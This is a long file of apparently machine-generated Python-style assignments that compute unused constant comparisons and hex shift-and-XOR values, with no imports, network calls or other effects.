tmp_l653 = (70 > 41) if False else (70 == 41)
tmp_m037 = (0xfa8 >> 3) ^ 0x26
tmp_l840 = (61 > 82) if True else (61 == 82)
tmp_l747 = (22 > 2) if False else (22 == 2)
tmp_m416 = (0x8f4 >> 1) ^ 0x92
tmp_m447 = (0x2f12 >> 1) ^ 0x13
tmp_m081 = (0x4a72 >> 2) ^ 0x89
tmp_m130 = (0xb5e1 >> 1) ^ 0x5a
tmp_l580 = (89 > 34) if False else (89 == 34)
tmp_m258 = (0xfe57 >> 1) ^ 0x78
tmp_l806 = (58 > 86) if True else (58 == 86)
tmp_l847 = (44 > 80) if True else (44 == 80)
tmp_m223 = (0x362d >> 2) ^ 0x5
tmp_m420 = (0xa562 >> 1) ^ 0xcd
tmp_l002 = (50 > 26) if False else (50 == 26)
tmp_m165 = (0x44d8 >> 4) ^ 0xa0
tmp_m073 = (0x1edd >> 2) ^ 0x1f
tmp_l092 = (5 > 99) if False else (5 == 99)
tmp_m437 = (0x9a33 >> 2) ^ 0xaf
tmp_m507 = (0xaa01 >> 1) ^ 0x58
tmp_m259 = (0x47e3 >> 2) ^ 0x8
tmp_m466 = (0xa266 >> 2) ^ 0x72
tmp_m266 = (0xa31c >> 1) ^ 0xc9
tmp_l485 = (54 > 73) if True else (54 == 73)
tmp_l138 = (13 > 37) if True else (13 == 37)
tmp_m364 = (0x999e >> 3) ^ 0x23
tmp_m322 = (0x570b >> 3) ^ 0xaf
tmp_m076 = (0xfeb4 >> 3) ^ 0x2
tmp_l881 = (63 > 76) if False else (63 == 76)
tmp_m149 = (0x656e >> 3) ^ 0x54
tmp_m340 = (0x7f65 >> 1) ^ 0x70
tmp_l461 = (97 > 50) if True else (97 == 50)
tmp_m182 = (0xb661 >> 1) ^ 0xce
tmp_m712 = (0x6c40 >> 3) ^ 0x81
tmp_m663 = (0x9e52 >> 3) ^ 0x4a
tmp_l049 = (49 > 23) if False else (49 == 23)
tmp_l267 = (95 > 51) if False else (95 == 51)
tmp_m555 = (0xd4ed >> 4) ^ 0x4
tmp_l807 = (24 > 51) if False else (24 == 51)
tmp_l114 = (98 > 53) if True else (98 == 53)
tmp_l587 = (75 > 22) if True else (75 == 22)
tmp_l231 = (98 > 83) if False else (98 == 83)
tmp_m064 = (0x807d >> 3) ^ 0x59
tmp_m249 = (0xdec4 >> 1) ^ 0x72
tmp_l674 = (79 > 12) if False else (79 == 12)
tmp_l401 = (63 > 22) if True else (63 == 22)
tmp_m635 = (0x6db >> 4) ^ 0x2c
tmp_l786 = (74 > 93) if True else (74 == 93)
tmp_m382 = (0xa99 >> 1) ^ 0xc5
tmp_m776 = (0x4238 >> 2) ^ 0x4d
tmp_m219 = (0x3473 >> 2) ^ 0x7d
tmp_m393 = (0x2be7 >> 1) ^ 0x85
tmp_l142 = (63 > 13) if False else (63 == 13)
tmp_m049 = (0x37a9 >> 2) ^ 0x47
tmp_l194 = (44 > 28) if False else (44 == 28)
tmp_l857 = (65 > 77) if False else (65 == 77)
tmp_l238 = (90 > 57) if False else (90 == 57)
tmp_m878 = (0xd503 >> 3) ^ 0x74
tmp_l372 = (34 > 89) if True else (34 == 89)
tmp_l810 = (44 > 58) if True else (44 == 58)
tmp_m558 = (0xb048 >> 3) ^ 0x64
tmp_l865 = (69 > 37) if True else (69 == 37)
tmp_m370 = (0xe416 >> 3) ^ 0xc7
tmp_l500 = (87 > 28) if True else (87 == 28)
tmp_m579 = (0x4049 >> 3) ^ 0x98
tmp_l864 = (98 > 31) if True else (98 == 31)
tmp_l189 = (45 > 92) if False else (45 == 92)
tmp_m764 = (0xc5ca >> 4) ^ 0x8a
tmp_l861 = (67 > 58) if True else (67 == 58)
tmp_l739 = (23 > 66) if True else (23 == 66)
tmp_l567 = (83 > 20) if False else (83 == 20)
tmp_m891 = (0xf482 >> 2) ^ 0xbb
tmp_m231 = (0xbead >> 1) ^ 0x22
tmp_m153 = (0x5df7 >> 4) ^ 0xe9
tmp_l515 = (47 > 4) if False else (47 == 4)
tmp_m418 = (0x6144 >> 1) ^ 0x9
tmp_m166 = (0xbab9 >> 2) ^ 0x4
tmp_l883 = (82 > 34) if True else (82 == 34)
tmp_m452 = (0x72b9 >> 2) ^ 0x17
tmp_l195 = (2 > 26) if False else (2 == 26)
tmp_m509 = (0x8b80 >> 3) ^ 0x4f
tmp_l570 = (20 > 19) if True else (20 == 19)
tmp_l684 = (70 > 49) if True else (70 == 49)
tmp_m832 = (0x982d >> 3) ^ 0x41
tmp_m819 = (0xb6f3 >> 2) ^ 0x11
tmp_l318 = (71 > 3) if False else (71 == 3)
tmp_m868 = (0x6d43 >> 1) ^ 0x87
tmp_m750 = (0x1df8 >> 4) ^ 0xba
tmp_l074 = (95 > 64) if False else (95 == 64)
tmp_l326 = (85 > 12) if False else (85 == 12)
tmp_l020 = (37 > 85) if False else (37 == 85)
tmp_l630 = (93 > 3) if True else (93 == 3)
tmp_m014 = (0x1bfa >> 4) ^ 0x65
tmp_l489 = (15 > 51) if True else (15 == 51)
tmp_m228 = (0xd2bf >> 4) ^ 0xd0
tmp_m657 = (0x2f79 >> 3) ^ 0xeb
tmp_l862 = (17 > 21) if True else (17 == 21)
tmp_l343 = (70 > 76) if False else (70 == 76)
tmp_l022 = (14 > 64) if False else (14 == 64)
tmp_l848 = (94 > 4) if False else (94 == 4)
tmp_m017 = (0xfeec >> 2) ^ 0xf4
tmp_l452 = (24 > 58) if True else (24 == 58)
tmp_m563 = (0x7a2e >> 3) ^ 0xb0
tmp_m877 = (0x8ae9 >> 3) ^ 0xf8
tmp_m091 = (0xa695 >> 4) ^ 0xac
tmp_l303 = (5 > 26) if False else (5 == 26)
tmp_l888 = (94 > 91) if False else (94 == 91)
tmp_l047 = (18 > 83) if True else (18 == 83)
tmp_l117 = (4 > 41) if False else (4 == 41)
tmp_l596 = (62 > 32) if True else (62 == 32)
tmp_l762 = (100 > 89) if True else (100 == 89)
tmp_m092 = (0x1ff4 >> 3) ^ 0x11
tmp_l524 = (7 > 63) if False else (7 == 63)
tmp_m477 = (0x928a >> 3) ^ 0xf6
tmp_l039 = (3 > 90) if True else (3 == 90)
tmp_l582 = (10 > 25) if True else (10 == 25)
tmp_l802 = (61 > 17) if True else (61 == 17)
tmp_l436 = (57 > 86) if False else (57 == 86)
tmp_m196 = (0x636f >> 4) ^ 0x7c
tmp_m229 = (0xcca8 >> 1) ^ 0x2f
tmp_l543 = (38 > 26) if False else (38 == 26)
tmp_l670 = (9 > 92) if False else (9 == 92)
tmp_l078 = (76 > 7) if False else (76 == 7)
tmp_m505 = (0xd7d3 >> 1) ^ 0xb7
tmp_m794 = (0x6670 >> 1) ^ 0xc3
tmp_m346 = (0x2791 >> 4) ^ 0xe8
tmp_m570 = (0x5fc7 >> 4) ^ 0x8f
tmp_m422 = (0xe000 >> 3) ^ 0x44
tmp_m824 = (0xe3a9 >> 3) ^ 0x2e
tmp_m591 = (0xb334 >> 4) ^ 0x4
tmp_l805 = (65 > 67) if True else (65 == 67)
tmp_l424 = (71 > 89) if False else (71 == 89)
tmp_l266 = (16 > 39) if False else (16 == 39)
tmp_l256 = (6 > 14) if False else (6 == 14)
tmp_l098 = (83 > 87) if True else (83 == 87)
tmp_l008 = (100 > 95) if False else (100 == 95)
tmp_l064 = (12 > 30) if True else (12 == 30)
tmp_m482 = (0x9d44 >> 4) ^ 0xc1
tmp_m025 = (0xf471 >> 1) ^ 0x8d
tmp_m610 = (0x53ef >> 3) ^ 0xcc
tmp_m439 = (0x8795 >> 1) ^ 0x67
tmp_l176 = (99 > 32) if False else (99 == 32)
tmp_m368 = (0x9930 >> 1) ^ 0x1f
tmp_l645 = (21 > 67) if True else (21 == 67)
tmp_m056 = (0xad1a >> 4) ^ 0x5f
tmp_m004 = (0xf3cd >> 2) ^ 0x71
tmp_m875 = (0x774e >> 3) ^ 0xf8
tmp_m711 = (0x2156 >> 2) ^ 0xfe
tmp_l335 = (27 > 98) if False else (27 == 98)
tmp_l446 = (94 > 18) if False else (94 == 18)
tmp_m757 = (0x18e1 >> 3) ^ 0x69
tmp_l714 = (92 > 43) if True else (92 == 43)
tmp_l402 = (34 > 97) if False else (34 == 97)
tmp_m115 = (0x96a >> 4) ^ 0x6e
tmp_m874 = (0xe4d4 >> 1) ^ 0xed
tmp_m464 = (0xcd68 >> 1) ^ 0x7a
tmp_l550 = (22 > 25) if False else (22 == 25)
tmp_l060 = (74 > 47) if True else (74 == 47)
tmp_l769 = (87 > 89) if True else (87 == 89)
tmp_m774 = (0xe33b >> 4) ^ 0xfb
tmp_l804 = (37 > 25) if True else (37 == 25)
tmp_m625 = (0x21cf >> 2) ^ 0xf8
tmp_l733 = (95 > 74) if True else (95 == 74)
tmp_l028 = (22 > 47) if False else (22 == 47)
tmp_l097 = (81 > 4) if False else (81 == 4)
tmp_m343 = (0x632b >> 2) ^ 0x6d
tmp_m157 = (0xe076 >> 4) ^ 0x75
tmp_m784 = (0x2a1d >> 4) ^ 0x50
tmp_l216 = (58 > 18) if True else (58 == 18)
tmp_l016 = (65 > 61) if False else (65 == 61)
tmp_l725 = (5 > 1) if True else (5 == 1)
tmp_m593 = (0xcd77 >> 4) ^ 0xd1
tmp_m337 = (0x3623 >> 2) ^ 0xe0
tmp_l030 = (12 > 20) if False else (12 == 20)
tmp_m424 = (0xf01f >> 2) ^ 0x45
tmp_l522 = (47 > 68) if True else (47 == 68)
tmp_m467 = (0x500e >> 1) ^ 0x69
tmp_l636 = (21 > 83) if True else (21 == 83)
tmp_m294 = (0x95c8 >> 2) ^ 0x5c
tmp_l230 = (10 > 81) if True else (10 == 81)
tmp_m850 = (0x1bdb >> 4) ^ 0xa4
tmp_m250 = (0xe4b >> 3) ^ 0xb2
tmp_l525 = (99 > 28) if True else (99 == 28)
tmp_m300 = (0x161b >> 4) ^ 0x28
tmp_l590 = (47 > 91) if True else (47 == 91)
tmp_l251 = (73 > 88) if True else (73 == 88)
tmp_l304 = (46 > 66) if True else (46 == 66)
tmp_m415 = (0xbe71 >> 2) ^ 0x81
tmp_l240 = (42 > 30) if True else (42 == 30)
tmp_m615 = (0xc0fa >> 2) ^ 0xe5
tmp_l270 = (33 > 84) if False else (33 == 84)
tmp_l779 = (13 > 42) if True else (13 == 42)
tmp_l544 = (65 > 29) if False else (65 == 29)
tmp_m212 = (0x1507 >> 2) ^ 0x5b
tmp_l342 = (72 > 18) if False else (72 == 18)
tmp_m871 = (0x848e >> 3) ^ 0x32
tmp_m751 = (0xcd9f >> 3) ^ 0xa8
tmp_m629 = (0xa945 >> 2) ^ 0xf3
tmp_m173 = (0x1548 >> 1) ^ 0xcc
tmp_l147 = (88 > 100) if False else (88 == 100)
tmp_m178 = (0x9fb0 >> 3) ^ 0x9a
tmp_l808 = (87 > 65) if False else (87 == 65)
tmp_l223 = (89 > 74) if False else (89 == 74)
tmp_l547 = (77 > 63) if False else (77 == 63)
tmp_l309 = (90 > 44) if False else (90 == 44)
tmp_m845 = (0xc321 >> 2) ^ 0x5b
tmp_m224 = (0x41d4 >> 4) ^ 0x43
tmp_l520 = (21 > 56) if False else (21 == 56)
tmp_l594 = (10 > 42) if False else (10 == 42)
tmp_m038 = (0xbc19 >> 4) ^ 0x55
tmp_m152 = (0xa504 >> 3) ^ 0xce
tmp_m005 = (0xc358 >> 2) ^ 0x1c
tmp_m410 = (0xa8cd >> 3) ^ 0xaf
tmp_l084 = (31 > 18) if False else (31 == 18)
tmp_l031 = (69 > 30) if False else (69 == 30)
tmp_m075 = (0xe524 >> 4) ^ 0x62
tmp_m428 = (0xff05 >> 3) ^ 0x70
tmp_m839 = (0xfca4 >> 4) ^ 0x92
tmp_m279 = (0x25ce >> 3) ^ 0x8a
tmp_l833 = (30 > 36) if True else (30 == 36)
tmp_l690 = (85 > 17) if True else (85 == 17)
tmp_l770 = (78 > 17) if True else (78 == 17)
tmp_l268 = (93 > 23) if False else (93 == 23)
tmp_m709 = (0x4ca5 >> 2) ^ 0x2e
tmp_m144 = (0xf2e2 >> 1) ^ 0xa6
tmp_l778 = (39 > 1) if False else (39 == 1)
tmp_m681 = (0x72ac >> 4) ^ 0x36
tmp_m866 = (0x4435 >> 4) ^ 0xde
tmp_l413 = (23 > 1) if False else (23 == 1)
tmp_m676 = (0x391 >> 4) ^ 0x94
tmp_m040 = (0x64a7 >> 2) ^ 0x54
tmp_l872 = (10 > 1) if True else (10 == 1)
tmp_l080 = (98 > 79) if True else (98 == 79)
tmp_l019 = (27 > 51) if False else (27 == 51)
tmp_m463 = (0x264b >> 1) ^ 0xea
tmp_l791 = (40 > 10) if False else (40 == 10)
tmp_m501 = (0x235d >> 3) ^ 0xdb
tmp_m838 = (0x3d6e >> 3) ^ 0x72
tmp_l501 = (48 > 12) if True else (48 == 12)
tmp_m013 = (0x1eb5 >> 3) ^ 0x2b
tmp_m495 = (0x746f >> 1) ^ 0x2e
tmp_l882 = (84 > 25) if True else (84 == 25)
tmp_m093 = (0xbe33 >> 4) ^ 0x88
tmp_m536 = (0xb8bc >> 4) ^ 0xf6
tmp_m094 = (0x125b >> 1) ^ 0x34
tmp_m028 = (0x535e >> 2) ^ 0x74
tmp_m864 = (0x5070 >> 1) ^ 0x18
tmp_l493 = (48 > 25) if False else (48 == 25)
tmp_l121 = (40 > 34) if False else (40 == 34)
tmp_l792 = (11 > 32) if False else (11 == 32)
tmp_m270 = (0xcaa4 >> 3) ^ 0x75
tmp_m493 = (0xff3b >> 4) ^ 0x73
tmp_m234 = (0xb4b9 >> 4) ^ 0xf6
tmp_l506 = (64 > 40) if False else (64 == 40)
tmp_l411 = (89 > 91) if False else (89 == 91)
tmp_m193 = (0x6078 >> 3) ^ 0x7c
tmp_l157 = (78 > 9) if False else (78 == 9)
tmp_m806 = (0x742f >> 3) ^ 0x16
tmp_l227 = (37 > 91) if True else (37 == 91)
tmp_m515 = (0x66b0 >> 4) ^ 0x37
tmp_l456 = (45 > 34) if False else (45 == 34)
tmp_m621 = (0x6ed7 >> 1) ^ 0x96
tmp_m090 = (0xa5e3 >> 3) ^ 0xe5
tmp_l263 = (22 > 55) if True else (22 == 55)
tmp_l171 = (60 > 9) if False else (60 == 9)
tmp_m174 = (0x451f >> 2) ^ 0xce
tmp_l202 = (13 > 23) if True else (13 == 23)
tmp_l160 = (21 > 87) if True else (21 == 87)
tmp_m189 = (0x6b36 >> 4) ^ 0xf0
tmp_m722 = (0xb1dc >> 3) ^ 0x6b
tmp_l823 = (80 > 42) if False else (80 == 42)
tmp_l280 = (89 > 85) if True else (89 == 85)
tmp_m291 = (0x1e4c >> 1) ^ 0xe7
tmp_l387 = (43 > 80) if True else (43 == 80)
tmp_l603 = (29 > 65) if True else (29 == 65)
tmp_m401 = (0x56ae >> 4) ^ 0x4
tmp_l659 = (2 > 45) if False else (2 == 45)
tmp_l174 = (19 > 88) if True else (19 == 88)
tmp_l412 = (4 > 28) if False else (4 == 28)
tmp_m754 = (0xd439 >> 3) ^ 0x39
tmp_m205 = (0xd724 >> 1) ^ 0x4e
tmp_l720 = (67 > 52) if False else (67 == 52)
tmp_l096 = (81 > 19) if True else (81 == 19)
tmp_m135 = (0xfe1 >> 3) ^ 0xa1
tmp_l018 = (22 > 96) if True else (22 == 96)
tmp_m433 = (0x6713 >> 3) ^ 0xcd
tmp_m647 = (0xebc8 >> 3) ^ 0x6c
tmp_m814 = (0x4535 >> 1) ^ 0xe3
tmp_l631 = (83 > 64) if True else (83 == 64)
tmp_l448 = (45 > 84) if False else (45 == 84)
tmp_l369 = (55 > 37) if True else (55 == 37)
tmp_l389 = (44 > 71) if True else (44 == 71)
tmp_m221 = (0xcd06 >> 4) ^ 0x4e
tmp_l742 = (68 > 77) if False else (68 == 77)
tmp_l107 = (67 > 98) if True else (67 == 98)
tmp_m450 = (0x50ea >> 4) ^ 0xc4
tmp_m892 = (0xc404 >> 1) ^ 0xbe
tmp_l156 = (54 > 77) if True else (54 == 77)
tmp_l307 = (12 > 5) if True else (12 == 5)
tmp_m604 = (0x62a2 >> 1) ^ 0x9a
tmp_l062 = (19 > 38) if True else (19 == 38)
tmp_l621 = (100 > 87) if True else (100 == 87)
tmp_m035 = (0xbd8b >> 1) ^ 0xac
tmp_l593 = (21 > 63) if True else (21 == 63)
tmp_l652 = (68 > 86) if True else (68 == 86)
tmp_m360 = (0xbf02 >> 1) ^ 0x9e
tmp_m769 = (0x3f37 >> 3) ^ 0x11
tmp_l873 = (43 > 63) if False else (43 == 63)
tmp_l349 = (61 > 87) if False else (61 == 87)
tmp_m827 = (0xf3d9 >> 2) ^ 0x9f
tmp_m305 = (0x8198 >> 3) ^ 0x89
tmp_l058 = (25 > 85) if True else (25 == 85)
tmp_m862 = (0x875e >> 3) ^ 0x6b
tmp_l460 = (2 > 87) if True else (2 == 87)
tmp_l657 = (89 > 26) if True else (89 == 26)
tmp_m033 = (0xb0f >> 4) ^ 0xfb
tmp_m820 = (0x920a >> 4) ^ 0x7a
tmp_l488 = (56 > 84) if False else (56 == 84)
tmp_m161 = (0xad7d >> 1) ^ 0x48
tmp_l852 = (64 > 2) if True else (64 == 2)
tmp_l627 = (92 > 37) if True else (92 == 37)
tmp_l329 = (100 > 41) if True else (100 == 41)
tmp_l104 = (1 > 66) if True else (1 == 66)
tmp_l152 = (90 > 12) if False else (90 == 12)
tmp_m356 = (0xae70 >> 4) ^ 0x6e
tmp_l753 = (83 > 44) if True else (83 == 44)
tmp_m204 = (0x83d >> 1) ^ 0xd6
tmp_l533 = (78 > 38) if True else (78 == 38)
tmp_l037 = (92 > 12) if True else (92 == 12)
tmp_l386 = (39 > 86) if True else (39 == 86)
tmp_l491 = (39 > 26) if False else (39 == 26)
tmp_l679 = (13 > 24) if True else (13 == 24)
tmp_m734 = (0xd049 >> 4) ^ 0xf9
tmp_l637 = (35 > 76) if True else (35 == 76)
tmp_m207 = (0x59e4 >> 3) ^ 0x39
tmp_m265 = (0xd967 >> 1) ^ 0x48
tmp_m087 = (0x8ae9 >> 1) ^ 0xe6
tmp_m741 = (0xf1e2 >> 4) ^ 0x91
tmp_l439 = (14 > 48) if True else (14 == 48)
tmp_l365 = (66 > 27) if False else (66 == 27)
tmp_l172 = (14 > 94) if False else (14 == 94)
tmp_l721 = (61 > 57) if True else (61 == 57)
tmp_l116 = (73 > 33) if False else (73 == 33)
tmp_m089 = (0x4685 >> 4) ^ 0x7
tmp_m459 = (0x2bc0 >> 4) ^ 0xd8
tmp_m118 = (0xa325 >> 2) ^ 0xe9
tmp_m699 = (0x418a >> 3) ^ 0x5b
tmp_m589 = (0x383e >> 3) ^ 0xb
tmp_l374 = (23 > 91) if False else (23 == 91)
tmp_m276 = (0x78ee >> 3) ^ 0xd6
tmp_m006 = (0x9aeb >> 3) ^ 0xba
tmp_m102 = (0x4cf5 >> 4) ^ 0x5f
tmp_m426 = (0xaa66 >> 4) ^ 0x57
tmp_m670 = (0xa6d8 >> 1) ^ 0xd9
tmp_m332 = (0x3625 >> 1) ^ 0x9b
tmp_m500 = (0x4f79 >> 2) ^ 0x40
tmp_m425 = (0xdc51 >> 1) ^ 0x11
tmp_m261 = (0xce1e >> 2) ^ 0x48
tmp_l477 = (63 > 70) if False else (63 == 70)
tmp_l033 = (65 > 88) if True else (65 == 88)
tmp_l476 = (62 > 42) if False else (62 == 42)
tmp_l073 = (71 > 53) if True else (71 == 53)
tmp_m164 = (0xf342 >> 1) ^ 0xed
tmp_l068 = (56 > 29) if True else (56 == 29)
tmp_l773 = (65 > 91) if True else (65 == 91)
tmp_m397 = (0xabe7 >> 1) ^ 0x38
tmp_l592 = (87 > 43) if True else (87 == 43)
tmp_l737 = (31 > 23) if False else (31 == 23)
tmp_l736 = (50 > 8) if False else (50 == 8)
tmp_l697 = (43 > 58) if True else (43 == 58)
tmp_m641 = (0x29d9 >> 1) ^ 0xf8
tmp_l854 = (19 > 40) if False else (19 == 40)
tmp_l599 = (37 > 58) if False else (37 == 58)
tmp_l395 = (60 > 85) if True else (60 == 85)
tmp_l048 = (87 > 97) if False else (87 == 97)
tmp_l161 = (5 > 69) if False else (5 == 69)
tmp_l838 = (87 > 19) if True else (87 == 19)
tmp_m435 = (0xd9b3 >> 3) ^ 0xfd
tmp_l729 = (72 > 37) if True else (72 == 37)
tmp_l244 = (46 > 83) if True else (46 == 83)
tmp_l462 = (27 > 65) if False else (27 == 65)
tmp_l735 = (27 > 29) if False else (27 == 29)
tmp_l748 = (33 > 99) if True else (33 == 99)
tmp_l306 = (84 > 39) if True else (84 == 39)
tmp_l140 = (35 > 26) if False else (35 == 26)
tmp_l090 = (33 > 99) if True else (33 == 99)
tmp_l589 = (45 > 50) if True else (45 == 50)
tmp_l181 = (88 > 51) if False else (88 == 51)
tmp_l200 = (38 > 95) if False else (38 == 95)
tmp_l065 = (57 > 37) if False else (57 == 37)
tmp_m365 = (0xcf34 >> 2) ^ 0xa6
tmp_m034 = (0xb543 >> 4) ^ 0x1
tmp_l258 = (20 > 79) if True else (20 == 79)
tmp_m573 = (0x2d06 >> 2) ^ 0x8
tmp_m451 = (0xadea >> 4) ^ 0x79
tmp_l422 = (2 > 78) if False else (2 == 78)
tmp_l012 = (38 > 37) if True else (38 == 37)
tmp_l597 = (74 > 57) if False else (74 == 57)
tmp_m396 = (0xbd6a >> 4) ^ 0x22
tmp_m018 = (0xd394 >> 2) ^ 0xa0
tmp_l809 = (95 > 46) if True else (95 == 46)
tmp_m688 = (0x784e >> 3) ^ 0xc3
tmp_l040 = (44 > 77) if True else (44 == 77)
tmp_m541 = (0x2fca >> 4) ^ 0x1b
tmp_m454 = (0xe268 >> 1) ^ 0xa5
tmp_l050 = (57 > 92) if True else (57 == 92)
tmp_l796 = (9 > 54) if True else (9 == 54)
tmp_l794 = (57 > 58) if True else (57 == 58)
tmp_l288 = (23 > 36) if True else (23 == 36)
tmp_l669 = (17 > 69) if True else (17 == 69)
tmp_l849 = (9 > 97) if False else (9 == 97)
tmp_l517 = (28 > 11) if True else (28 == 11)
tmp_m202 = (0xa49f >> 2) ^ 0x3f
tmp_m009 = (0xebdb >> 2) ^ 0x98
tmp_l164 = (97 > 94) if True else (97 == 94)
tmp_l076 = (58 > 52) if False else (58 == 52)
tmp_m109 = (0xe9f6 >> 4) ^ 0x63
tmp_l229 = (26 > 35) if False else (26 == 35)
tmp_m885 = (0xbfc9 >> 4) ^ 0xd
tmp_m409 = (0x5d75 >> 2) ^ 0xe8
tmp_l677 = (49 > 63) if True else (49 == 63)
tmp_l290 = (80 > 16) if False else (80 == 16)
tmp_m191 = (0xc5ab >> 1) ^ 0xfd
tmp_m689 = (0x2038 >> 4) ^ 0xe1
tmp_l571 = (42 > 17) if True else (42 == 17)
tmp_l826 = (83 > 14) if True else (83 == 14)
tmp_l322 = (61 > 27) if True else (61 == 27)
tmp_m642 = (0xe6ad >> 4) ^ 0x8a
tmp_m826 = (0x1c4 >> 3) ^ 0x6d
tmp_m706 = (0x8dd5 >> 1) ^ 0x55
tmp_m531 = (0x39f0 >> 1) ^ 0x6e
tmp_m328 = (0xaf24 >> 4) ^ 0xf0
tmp_m057 = (0x9de7 >> 3) ^ 0xb7
tmp_m522 = (0x25fe >> 3) ^ 0xe4
tmp_l038 = (80 > 50) if False else (80 == 50)
tmp_m726 = (0x4947 >> 3) ^ 0x7e
tmp_m490 = (0x540f >> 2) ^ 0xf0
tmp_m374 = (0xade0 >> 2) ^ 0x27
tmp_m627 = (0x43f3 >> 3) ^ 0x5
tmp_m857 = (0xac74 >> 1) ^ 0xd0
tmp_l419 = (95 > 79) if False else (95 == 79)
tmp_l110 = (29 > 15) if True else (29 == 15)
tmp_m581 = (0xcee7 >> 1) ^ 0x78
tmp_m381 = (0x66a7 >> 3) ^ 0x33
tmp_l821 = (12 > 59) if True else (12 == 59)
tmp_m053 = (0x7f73 >> 4) ^ 0xda
tmp_m217 = (0x1205 >> 1) ^ 0x23
tmp_m252 = (0xc9de >> 1) ^ 0x34
tmp_l832 = (6 > 27) if True else (6 == 27)
tmp_m022 = (0x7c97 >> 4) ^ 0xd8
tmp_l814 = (45 > 48) if False else (45 == 48)
tmp_l441 = (99 > 47) if True else (99 == 47)
tmp_m394 = (0xcd5c >> 4) ^ 0x85
tmp_l429 = (90 > 2) if False else (90 == 2)
tmp_m524 = (0x8db1 >> 4) ^ 0xee
tmp_l689 = (81 > 97) if True else (81 == 97)
tmp_m608 = (0x35f6 >> 3) ^ 0x7d
tmp_m052 = (0x6b7d >> 2) ^ 0xeb
tmp_l532 = (15 > 40) if True else (15 == 40)
tmp_m645 = (0x1191 >> 1) ^ 0x8c
tmp_l205 = (78 > 61) if True else (78 == 61)
tmp_m323 = (0xb13 >> 3) ^ 0xc8
tmp_l629 = (70 > 8) if False else (70 == 8)
tmp_l392 = (55 > 35) if False else (55 == 35)
tmp_m745 = (0x8e65 >> 1) ^ 0x45
tmp_m176 = (0x5c6e >> 1) ^ 0x56
tmp_l120 = (55 > 33) if False else (55 == 33)
tmp_l650 = (44 > 27) if False else (44 == 27)
tmp_l249 = (76 > 21) if True else (76 == 21)
tmp_l370 = (65 > 41) if True else (65 == 41)
tmp_l459 = (87 > 21) if False else (87 == 21)
tmp_l384 = (12 > 17) if False else (12 == 17)
tmp_l109 = (29 > 9) if True else (29 == 9)
tmp_m384 = (0x82c8 >> 1) ^ 0xac
tmp_m441 = (0x988 >> 1) ^ 0x9b
tmp_m387 = (0xa014 >> 4) ^ 0x97
tmp_l601 = (39 > 82) if True else (39 == 82)
tmp_m377 = (0xf2c7 >> 1) ^ 0xb4
tmp_m105 = (0xd255 >> 4) ^ 0x58
tmp_l291 = (17 > 3) if True else (17 == 3)
tmp_l212 = (98 > 40) if True else (98 == 40)
tmp_m145 = (0x509d >> 3) ^ 0x39
tmp_l555 = (82 > 40) if False else (82 == 40)
tmp_l640 = (3 > 27) if False else (3 == 27)
tmp_l045 = (8 > 35) if False else (8 == 35)
tmp_l466 = (95 > 46) if False else (95 == 46)
tmp_m383 = (0x2f65 >> 4) ^ 0x68
tmp_l534 = (43 > 36) if True else (43 == 36)
tmp_l793 = (42 > 8) if True else (42 == 8)
tmp_l159 = (21 > 64) if False else (21 == 64)
tmp_l642 = (54 > 74) if False else (54 == 74)
tmp_m612 = (0xc212 >> 3) ^ 0xf5
tmp_l616 = (28 > 75) if False else (28 == 75)
tmp_m062 = (0xf154 >> 3) ^ 0x21
tmp_m222 = (0xbc12 >> 3) ^ 0xe6
tmp_l787 = (23 > 31) if False else (23 == 31)
tmp_l296 = (19 > 66) if False else (19 == 66)
tmp_m666 = (0x9dab >> 3) ^ 0xae
tmp_m188 = (0xd7df >> 1) ^ 0x2e
tmp_l719 = (27 > 27) if True else (27 == 27)
tmp_l842 = (84 > 77) if True else (84 == 77)
tmp_m413 = (0xcfac >> 3) ^ 0xab
tmp_l126 = (90 > 57) if True else (90 == 57)
tmp_l724 = (90 > 59) if False else (90 == 59)
tmp_l527 = (55 > 14) if True else (55 == 14)
tmp_m154 = (0x32e3 >> 4) ^ 0x22
tmp_l148 = (4 > 56) if False else (4 == 56)
tmp_m870 = (0x75b >> 1) ^ 0xd7
tmp_m348 = (0x50ab >> 2) ^ 0x59
tmp_m526 = (0x27bf >> 2) ^ 0x69
tmp_m744 = (0x3d8b >> 4) ^ 0x3
tmp_m595 = (0x6bae >> 4) ^ 0x61
tmp_l302 = (43 > 92) if True else (43 == 92)
tmp_m700 = (0x761 >> 1) ^ 0xe2
tmp_l242 = (51 > 23) if False else (51 == 23)
tmp_l694 = (2 > 36) if False else (2 == 36)
tmp_m476 = (0xabb0 >> 4) ^ 0x6
tmp_l367 = (80 > 46) if True else (80 == 46)
tmp_l225 = (87 > 85) if False else (87 == 85)
tmp_l025 = (67 > 93) if False else (67 == 93)
tmp_m735 = (0xc25c >> 4) ^ 0x37
tmp_l042 = (36 > 34) if True else (36 == 34)
tmp_l822 = (100 > 51) if True else (100 == 51)
tmp_l499 = (25 > 36) if False else (25 == 36)
tmp_l264 = (1 > 64) if False else (1 == 64)
tmp_m128 = (0xbc45 >> 2) ^ 0x5a
tmp_m156 = (0x8c35 >> 4) ^ 0x11
tmp_l339 = (99 > 20) if False else (99 == 20)
tmp_m045 = (0xc554 >> 2) ^ 0xc2
tmp_m055 = (0xbd0c >> 4) ^ 0xd7
tmp_l414 = (64 > 47) if True else (64 == 47)
tmp_l082 = (69 > 51) if False else (69 == 51)
tmp_m299 = (0x93e4 >> 4) ^ 0x6b
tmp_l672 = (97 > 18) if True else (97 == 18)
tmp_m097 = (0x7cfd >> 1) ^ 0x44
tmp_m398 = (0xc692 >> 4) ^ 0x9a
tmp_m801 = (0xe20c >> 3) ^ 0xef
tmp_m011 = (0x99f5 >> 1) ^ 0x3e
tmp_m253 = (0x4d5b >> 1) ^ 0x91
tmp_m046 = (0x1717 >> 3) ^ 0x14
tmp_l044 = (65 > 96) if False else (65 == 96)
tmp_m484 = (0xf098 >> 4) ^ 0x52
tmp_m358 = (0xbd64 >> 3) ^ 0x8a
tmp_m403 = (0xe8c8 >> 2) ^ 0x8e
tmp_l099 = (47 > 31) if False else (47 == 31)
tmp_l178 = (35 > 78) if False else (35 == 78)
tmp_m732 = (0x4f30 >> 3) ^ 0xad
tmp_l383 = (81 > 36) if False else (81 == 36)
tmp_m065 = (0xc385 >> 2) ^ 0x92
tmp_l698 = (18 > 32) if True else (18 == 32)
tmp_l167 = (63 > 32) if True else (63 == 32)
tmp_m175 = (0x9cdc >> 3) ^ 0xb
tmp_l213 = (51 > 96) if True else (51 == 96)
tmp_l085 = (74 > 82) if False else (74 == 82)
tmp_m781 = (0x5ddf >> 3) ^ 0x6a
tmp_l125 = (69 > 31) if True else (69 == 31)
